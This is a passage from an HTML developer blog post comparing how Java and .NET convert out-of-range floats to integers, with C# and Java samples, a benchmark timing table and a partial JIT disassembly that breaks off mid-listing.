<P>class</FONT><FONT face=Courier size=2> Test {<BR></FONT><FONT face=Courier color=#0000ff size=2>&nbsp; public</FONT><FONT face=Courier size=2> </FONT><FONT face=Courier color=#0000ff size=2>static</FONT><FONT face=Courier size=2> </FONT><FONT face=Courier color=#0000ff size=2>void</FONT><FONT face=Courier size=2> main(String[] args) {<BR></FONT><FONT face=Courier color=#0000ff size=2>&nbsp;&nbsp;&nbsp; float</FONT><FONT face=Courier size=2> f = Integer.MIN_VALUE;<BR>&nbsp;&nbsp;&nbsp; f -= 5;<BR>&nbsp;&nbsp;&nbsp; System.out.println((</FONT><FONT face=Courier color=#0000ff size=2>int</FONT><FONT face=Courier size=2>)(f + 0.5f));<BR>&nbsp; }<BR>}</P></FONT>
<P>Java output: -2147483648 (= Integer.MIN_VALUE)</P>
<P>C# code:</P><FONT face=Courier color=#0000ff size=2>
<P>class</FONT><FONT face=Courier size=2> Test {<BR></FONT><FONT face=Courier color=#0000ff size=2>&nbsp; static</FONT><FONT face=Courier size=2> </FONT><FONT face=Courier color=#0000ff size=2>void</FONT><FONT face=Courier size=2> Main() {<BR></FONT><FONT face=Courier color=#0000ff size=2>&nbsp;&nbsp;&nbsp; float</FONT><FONT face=Courier size=2> f = </FONT><FONT face=Courier color=#0000ff size=2>int</FONT><FONT face=Courier size=2>.MinValue;<BR>&nbsp;&nbsp;&nbsp; f -= 5;<BR>&nbsp;&nbsp;&nbsp; System.Console.WriteLine((</FONT><FONT face=Courier color=#0000ff size=2>int</FONT><FONT face=Courier size=2>)(f + 0.5f));<BR>&nbsp; }<BR>}</P></FONT>
<P>C# output (release build): 2147483644<BR>C# output (debug build): -2147483647</P>
<P>It turns out that the CIL instruction <I>conv.i4</I> returns an undefined value when the float value lies outside of the range representable by an 32 bit integer, unlike the JVM's <I>f2i</I> instruction which is defined to return either Integer.MIN_VALUE or Integer.MAX_VALUE in that case.</P>
<P>If you want your .NET code to run consistently, use the <I>conv.ovf.i4</I> instruction that checks for overflow. In C# this can be done by using a <I>checked</I> block:</P><FONT face=Courier color=#0000ff>
<P>class</FONT><FONT face=Courier size=2> Test {<BR></FONT><FONT face=Courier color=#0000ff size=2>&nbsp; static</FONT><FONT face=Courier size=2> </FONT><FONT face=Courier color=#0000ff size=2>void</FONT><FONT face=Courier size=2> Main() {<BR></FONT><FONT face=Courier color=#0000ff size=2>&nbsp;&nbsp;&nbsp; float</FONT><FONT face=Courier size=2> f = </FONT><FONT face=Courier color=#0000ff size=2>int</FONT><FONT face=Courier size=2>.MinValue;<BR>&nbsp;&nbsp;&nbsp; f -= 5;<BR></FONT><FONT face=Courier color=#0000ff size=2>&nbsp;&nbsp;&nbsp; checked </FONT><FONT face=Courier size=2>{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.Console.WriteLine((</FONT><FONT face=Courier color=#0000ff size=2>int</FONT><FONT face=Courier size=2>)(f + 0.5f));<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp; }<BR>}</P></FONT>
<P>Now, instead of returning an undefined value,&nbsp;the&nbsp;cast&nbsp;throws a System.OverflowException.</P>
<P>The JVM designers felt it was very important not to have any undefined or implementation defined behavior. One of the lessons learned from C and C++ is that whenever there is undefined or implementation defined behavior, code will be written that depends on the behavior of a particular platform/compiler. The JVM designers wanted to removed this source of portability problems.</P>
<P>However, they payed a&nbsp;price in performance for this. A well known example is the case of floating point performance (on x86), which was later "fixed" by relaxing the floating point specification and introducing <I>strictfp</I>. As <A href="http://whatisthematrix.warnerbros.com/">Morpheus</A> would say: "Welcome to the real world!" (Don Box claims everything in computing can be understood by watching The Matrix enough times).</P>
<P>Let's examine the performance of Java's <I>f2i</I> compared with .NET's <I>conv.i4.</I> Please note that the usual disclaimer wrt (micro) benchmarking applies.</P>
<P>Here is the loop I used:</P><FONT face=Courier color=#0000ff size=2>
<P>float</FONT><FONT face=Courier size=2> f = SOME_VALUE;<BR></FONT><FONT face=Courier color=#0000ff size=2>for</FONT><FONT face=Courier size=2>(</FONT><FONT face=Courier color=#0000ff size=2>int</FONT><FONT face=Courier size=2> i = 0; i &lt; 10000000; i++) {<BR></FONT><FONT face=Courier color=#0000ff size=2>&nbsp; int</FONT><FONT face=Courier size=2> j = (</FONT><FONT face=Courier color=#0000ff size=2>int</FONT><FONT face=Courier size=2>)f;<BR>&nbsp; f = j;<BR>}</P></FONT>
<P>Timings:</P>
<P>
<TABLE class=MsoTableGrid style="BORDER-RIGHT: medium none; BORDER-TOP: medium none; BORDER-LEFT: medium none; BORDER-BOTTOM: medium none; BORDER-COLLAPSE: collapse; mso-table-layout-alt: fixed; mso-border-alt: solid windowtext .5pt; mso-yfti-tbllook: 480; mso-padding-alt: 0in 5.4pt 0in 5.4pt; mso-border-insideh: .5pt solid windowtext; mso-border-insidev: .5pt solid windowtext" cellSpacing=0 cellPadding=0 border=1>
<TBODY>
<TR style="mso-yfti-irow: 0">
<TD style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 1.45in; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; BACKGROUND-COLOR: transparent" vAlign=top width=139>
<P class=MsoNormal style="MARGIN: 0in 0in 0pt"><?xml:namespace prefix = o ns = "urn:schemas-microsoft-com:office:office" /><o:p><FONT face="Times New Roman">&nbsp;</FONT></o:p></P></TD>
<TD style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 0.5in; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; BACKGROUND-COLOR: transparent" vAlign=top width=48>
<P class=MsoNormal style="MARGIN: 0in 0in 0pt"><o:p><FONT face="Times New Roman">&nbsp;</FONT></o:p></P></TD>
<TD style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 99pt; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-bottom-alt: solid windowtext .5pt" vAlign=top width=132 colSpan=2>
<P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: center" align=center><FONT face="Times New Roman">SOME_VALUE<o:p></o:p></FONT></P></TD></TR>
<TR style="mso-yfti-irow: 1">
<TD style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 1.45in; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-bottom-alt: solid windowtext .5pt" vAlign=top width=139>
<P class=MsoNormal style="MARGIN: 0in 0in 0pt"><o:p><FONT face="Times New Roman">&nbsp;</FONT></o:p></P></TD>
<TD style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 0.5in; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-bottom-alt: solid windowtext .5pt; mso-border-right-alt: solid windowtext .5pt" vAlign=top width=48>
<P class=MsoNormal style="MARGIN: 0in 0in 0pt"><o:p><FONT face="Times New Roman">&nbsp;</FONT></o:p></P></TD>
<TD style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 45pt; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt" vAlign=top width=60>
<P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: center" align=center><FONT face="Times New Roman">0<o:p></o:p></FONT></P></TD>
<TD style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: windowtext 1pt solid; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 0.75in; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt" vAlign=top width=72>
<P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: center" align=center><FONT face="Times New Roman">+Infinity<o:p></o:p></FONT></P></TD></TR>
<TR style="mso-yfti-irow: 2">
<TD style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: windowtext 1pt solid; WIDTH: 1.45in; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt" width=139 rowSpan=2>
<P class=MsoNormal style="MARGIN: 0in 0in 0pt"><FONT face="Times New Roman">Sun JDK 1.1 (Symantec JIT)<o:p></o:p></FONT></P></TD>
<TD style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 0.5in; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt" vAlign=top width=48>
<P class=MsoNormal style="MARGIN: 0in 0in 0pt"><FONT face="Times New Roman">Float<o:p></o:p></FONT></P></TD>
<TD style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 45pt; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt" width=60>
<P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" align=right><FONT face="Times New Roman">600 ms<o:p></o:p></FONT></P></TD>
<TD style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 0.75in; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt" width=72>
<P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" align=right><FONT face="Times New Roman">2000 ms<o:p></o:p></FONT></P></TD></TR>
<TR style="mso-yfti-irow: 3">
<TD style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 0.5in; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt" vAlign=top width=48>
<P class=MsoNormal style="MARGIN: 0in 0in 0pt"><FONT face="Times New Roman">Double*<o:p></o:p></FONT></P></TD>
<TD style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 45pt; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt" width=60>
<P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" align=right><FONT face="Times New Roman">800 ms<o:p></o:p></FONT></P></TD>
<TD style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 0.75in; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt" width=72>
<P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" align=right><FONT face="Times New Roman">2300 ms<o:p></o:p></FONT></P></TD></TR>
<TR style="mso-yfti-irow: 4">
<TD style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: windowtext 1pt solid; WIDTH: 1.45in; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt" vAlign=top width=139 rowSpan=2>
<P class=MsoNormal style="MARGIN: 0in 0in 0pt"><FONT face="Times New Roman">Sun J2RE 1.4.1 (Hotspot Client VM)<o:p></o:p></FONT></P></TD>
<TD style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 0.5in; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt" vAlign=top width=48>
<P class=MsoNormal style="MARGIN: 0in 0in 0pt"><FONT face="Times New Roman">Float<o:p></o:p></FONT></P></TD>
<TD style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 45pt; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt" width=60>
<P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" align=right><FONT face="Times New Roman">600 ms<o:p></o:p></FONT></P></TD>
<TD style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 0.75in; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt" width=72>
<P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" align=right><FONT face="Times New Roman">3800 ms<o:p></o:p></FONT></P></TD></TR>
<TR style="mso-yfti-irow: 5">
<TD style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 0.5in; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt" vAlign=top width=48>
<P class=MsoNormal style="MARGIN: 0in 0in 0pt"><FONT face="Times New Roman">Double*<o:p></o:p></FONT></P></TD>
<TD style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 45pt; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt" width=60>
<P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" align=right><FONT face="Times New Roman">1100 ms<o:p></o:p></FONT></P></TD>
<TD style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 0.75in; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt" width=72>
<P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" align=right><FONT face="Times New Roman">2600 ms<o:p></o:p></FONT></P></TD></TR>
<TR style="mso-yfti-irow: 6">
<TD style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: windowtext 1pt solid; WIDTH: 1.45in; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt" width=139 rowSpan=2>
<P class=MsoNormal style="MARGIN: 0in 0in 0pt"><FONT face="Times New Roman">.NET 1.0<o:p></o:p></FONT></P></TD>
<TD style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 0.5in; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt" vAlign=top width=48>
<P class=MsoNormal style="MARGIN: 0in 0in 0pt"><FONT face="Times New Roman">Float<o:p></o:p></FONT></P></TD>
<TD style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 45pt; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt" width=60>
<P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" align=right><FONT face="Times New Roman">500 ms<o:p></o:p></FONT></P></TD>
<TD style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 0.75in; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt" width=72>
<P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" align=right><FONT face="Times New Roman">500 ms<o:p></o:p></FONT></P></TD></TR>
<TR style="mso-yfti-irow: 7">
<TD style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 0.5in; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt" vAlign=top width=48>
<P class=MsoNormal style="MARGIN: 0in 0in 0pt"><FONT face="Times New Roman">Double*<o:p></o:p></FONT></P></TD>
<TD style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 45pt; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt" width=60>
<P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" align=right><FONT face="Times New Roman">800 ms<o:p></o:p></FONT></P></TD>
<TD style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 0.75in; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt" width=72>
<P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" align=right><FONT face="Times New Roman">800 ms<o:p></o:p></FONT></P></TD></TR>
<TR style="mso-yfti-irow: 8">
<TD style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: windowtext 1pt solid; WIDTH: 1.45in; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt" width=139 rowSpan=2>
<P class=MsoNormal style="MARGIN: 0in 0in 0pt"><FONT face="Times New Roman">.NET 1.0</FONT></P>
<P class=MsoNormal style="MARGIN: 0in 0in 0pt"><FONT face="Times New Roman">(checked)<o:p></o:p></FONT></P></TD>
<TD style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 0.5in; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt" vAlign=top width=48>
<P class=MsoNormal style="MARGIN: 0in 0in 0pt"><FONT face="Times New Roman">Float<o:p></o:p></FONT></P></TD>
<TD style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 45pt; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt" width=60>
<P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" align=right><FONT face="Times New Roman">800 ms<o:p></o:p></FONT></P></TD>
<TD style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 0.75in; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt" width=72>
<P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" align=right><FONT face="Times New Roman">n/a<o:p></o:p></FONT></P></TD></TR>
<TR style="mso-yfti-irow: 9; mso-yfti-lastrow: yes">
<TD style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 0.5in; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt" vAlign=top width=48>
<P class=MsoNormal style="MARGIN: 0in 0in 0pt"><FONT face="Times New Roman">Double*<o:p></o:p></FONT></P></TD>
<TD style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 45pt; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt" width=60>
<P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" align=right><FONT face="Times New Roman">1200 ms<o:p></o:p></FONT></P></TD>
<TD style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 0.75in; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt" width=72>
<P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" align=right><FONT face="Times New Roman">n/a<o:p></o:p></FONT></P></TD></TR></TBODY></TABLE></P>
<P>* For the double test, the value was cast to a long instead of an int.</P>
<P>Let's look at the code that the Symantec JIT uses to convert a float to an int:</P><PRE>01F543F0&nbsp; ftst&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>01F543F2&nbsp; fldcw&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; word ptr ds:[1F5FB30h] <BR>01F543F8&nbsp; push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax&nbsp; <BR>01F543F9&nbsp; fistp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dword ptr [esp] <BR>01F543FC&nbsp; fldcw&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; word ptr ds:[1F5FB34h] <BR>01F54402&nbsp; pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax&nbsp; <BR>01F54403&nbsp; cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax,80000000h<BR>01F54408&nbsp; je&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 01F5440B <BR>01F5440A&nbsp; ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>01F5440B&nbsp; push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax&nbsp; <BR>01F5440C&nbsp; fnstsw&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ax&nbsp;&nbsp; <BR>01F5440E&nbsp; sahf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>01F5440F&nbsp; pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax&nbsp; <BR>01F54410&nbsp; jp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 01F54416 <BR>01F54412&nbsp; adc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax,0FFFFFFFFh <BR>01F54415&nbsp; ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>01F54416&nbsp; 